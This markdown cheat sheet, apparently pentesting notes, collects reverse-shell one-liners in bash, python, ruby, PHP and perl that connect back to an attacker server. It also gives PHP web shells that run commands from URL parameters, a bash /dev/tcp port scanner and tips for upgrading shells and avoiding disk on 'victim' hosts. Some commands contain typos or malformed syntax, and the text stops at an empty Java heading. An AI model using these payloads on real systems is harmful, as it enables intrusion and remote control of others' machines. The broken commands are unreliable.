# Shells

>  A shell is software/protocol that provides an interface for an CLI to the underlying OS


### BASH

######  REMEMBER IF YOU NEVER WANT TO TOUCH DISK ON THE REMOTE HOST ALWAYS USE /dev/shm (SHARED MEMORY) , AS THIS IS TREATED AS VIRTUAL MEMORY AND MOUNTED AS tmpfs NOTHING IS STORED OR WRITTEN TO DISK. THE BONUS IS THAT YOU WILL SEE A PERFORMANCE INCREASE TOO.
<hr>
Bash as it stands, is a (the most popular) shell on its own, but can also provide some really neat tricks to allow for all kinds of shell related goodness, such as a reverse shell.

#### Bash reverse shell

* Spawn a reverse shell back to your server using /dev/tcp or /dev/udp
    > bash -i >& /dev/tcp/\<yourserver>/8080 0>&1 
    
		Example:  bash -i >& /dev/tcp/10.10.10.1/8080 0>&1
    <br>
    > or bassh -c bash -i >& /dev/tcp/\<yourserver>/8080 0>&1 
    
		Example: bash -i >& /dev/tcp/yourserver.com/443 0>&1
    <br>

#### Bash /dev/tcp or /dev/udp port scanner

 * Using /dev/tcp or /dev/udp to do a port scan, useful for checking connected hosts for laterial movement
    * Example looking for open web connection on a remote host when no port scammer is available:
        <br> 

			 for port in {21.\.443}; do echo -e "GET / HTTP/1.0\n\n" > bash -i >& /dev/tcp/\<server>/\$port 0>&1 && echo -e "\n[Port $port is UP]\n"; done

<br>
 
 * Of course you could also always put this in a shell script, as originally found on oreilly.com/pub/h/5299 and small mod by Luke Bonanomi [bash port scanner](https://github.com/rupert0/shell/blob/master/bash/portscanner)
<br>

    	#!/usr/bin/env bash
    	
	    for port in \$(yes scan | head -$3)
		    do
		    (( start++ ))
		    if [[ -n $(echo '' > /dev/$2/$1/$start && echo "up") ]];
			    then
				echo "Port $start" >> scan;
		    fi
	    done;
	    clear;
	    cat scan;
	    rm scan;

			> ./portscan.sh 127.0.0.1 tcp 122 2> /dev/null
<br>

 * Another useful reverse shell we could do with bash and /dev/tcp or /dev/udp is create a connection that basically mimics netcat but done purley in bash, start off with a netcat listener on your server:
	> nc -lvvvnp 8001
	
*	Then on the remote server we use some bash-fu
	> exec 5<>/dev/tcp/\<yourserver>/8001 && while read line 0<&5; do $line 2>&5 >\&5; done
	
* This will allow everything you type on your server to be executed on the remote server and the output is conveniently piped back to you 
<hr>

### Python
Of course the reverse shell options are always going to be dependent on the installed scripting languages, but almost all systems have python installed. That is great news as it allows us to do a few handy tricks from a reverse shell to setting the stty to act and feel like a full shell with tab complete and the works.

#### Python reverse shell

 - Spawn a reverse shell back to your server using python built in libraries.
 

	> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("\<yourserver>",8001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
	
- Once you have the shell (with sh or any dumb shell) you can then escalate if you so wish to bash or the full shell of your choice with :

	    $ python -c "import pty;pty.spawn('/bin/bash')"
	    
- Then background the shell and set stty and then foreground again for a complete fully functional shell, to background the shell use Ctrl Z and type :
 
		$ stty raw -echo
		
- Then foreground again with fg. I have on occasion had to type reset as well.
- Advantages to this is of course the ability to run things like ssh and vim have tab-complete, job control and history to mention a few.

###### REMEMBER TO ALWAYS CHECK FOR PYTHON 3 IF YOU  GET PYTHON ERRORS OR NOT FOUND ERRORS

#### When all else fails
- And you can't get a shell, you could simply create a web interface to the current directory, using :

	    python -m SimpleHTTPServer 8001 
- or for python3 use :  

	    python3 -m http.server 8001

- Then point your browser at the victim server on port 8001, or use a port that would always be allowed through the firewall like port 80 or 443 or 21, 25 ,110 etc. This assumes that the victims machine is either external facing  or you are sitting internally.

<hr>

### Ruby
If ruby is installed instead of python or you prefer ruby, then the reverse shell is just as easy and you can follow the steps above to escalate to full shell :

> ruby -rsocket -e"f=TCPSocket.open('\<yourserver>',8001).to_i;exec sprintf('/bin/sh -i <&%d >&%d 2>&%d',f,f,f)"

- If for some reason you can't get the /bin/sh or any other shell, you could use IO to execute commands :

> ruby -rsocket -e "exit if fork;c=TCPSocket.new('\<yourserver>',8001);while(cmd=c.gets);IO.popen(cmd,'r'){|io|c.print io.read}end"

- As with python if all else fails and you can't get a shell serve the current directory over a web interface :

	    ruby -run -e httpd . -p 8001

<hr>

### PHP
The best thing about php is that it is almost always installed (even if just for the might need it later sysadmin), certainly if there is any sort of database used on the system. Just remember for a reverse shell served as a .php file across the web service might require you enabling the php module for apache etc :

> php -r "$sock=fsockopen('\<yourserver>,8001);exec('/bin/sh -i <&3 >&3 2>&3');"

- If you are having a problem with the above reverse shell or getting an error related to file descriptors replace 3 with another file descriptor like 4 or 5 etc.

	    Example : php -r "$sock=fsockopen('10.10.10.145',8001);exec('/bin/sh -i <&5 >&5 2>&5');"

- Again as with the other options so far if all else fails and you can't get a reverse shell from the CLI you can always try over the web service (assuming the hp module is enabled). A quick cheeky one liner for the php file would be to use our bash reverse shell (remember to start a listener on your server first) :

	> <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/\10.10.10.145/8001 0>&1'"); ?>
 
 - or here are a few complete reverse shells using the browser as the CLI  (file saved as 1.php):
 
 

	    <pre> <?= $_GET[1] ?>
	    
		    called via browser: http://someserver.com/somedir/1.php?1=ls%20-lah

	<br>

		<pre> <? echo passthru($_GET['cmd']); ?>
		
			called via browser: http://someserver.com/somedir/1.php?cmd=whoami
	
	<br>

	    <pre> <?php echo system($_GET["c"]); ?>
	    
		    called via browser : http://someserver/somedir/1.php?c=id

	 <br>

	    <pre> <?php echo shell_exec($_GET["sc"]." 2>&1"); ?>
	    
		    called via browser : http://someserver/1.php?sc=ls%20-lah%20/tmp

- Doesn't get much smaller and easier than that.

<hr>

### Perl
Not found installed very often any more, but have found it mostly on .mil / .gov related sites that still make use of cgi-bin or cgi. But still a very good option if it is installed to pop a reverse shell :

> perl -e "use Socket;\$i='\<yourserver>';$p=8001;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};"

- As with every other reverse shell using a "dumb" shell link sh, use the trick above with python to spawn a fully functional shell
- Another reverse shell option that does not use /bin/sh would be :

	> perl -MIO -e "\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,'\<yourserver>:8001');STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);system\$_ while<>;"

- For windows based systems use the following :

	> perl -MIO -e "\$c=new IO::Socket::INET(PeerAddr,'\<yourserver>:8001');STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);system\$_ while<>;"

- Again if all else fails scenario you could pop a http daemon to get a web interface :

	> perl -MHTTP::Daemon -e '\$d = HTTP::Daemon->new(LocalPort => 8001) or die \$!; while (\$c = \$d->accept) { while (\$r = \$c->get_request) {\$c->send_file_response(".".\$r->url->path) } }'

<hr>

### Java

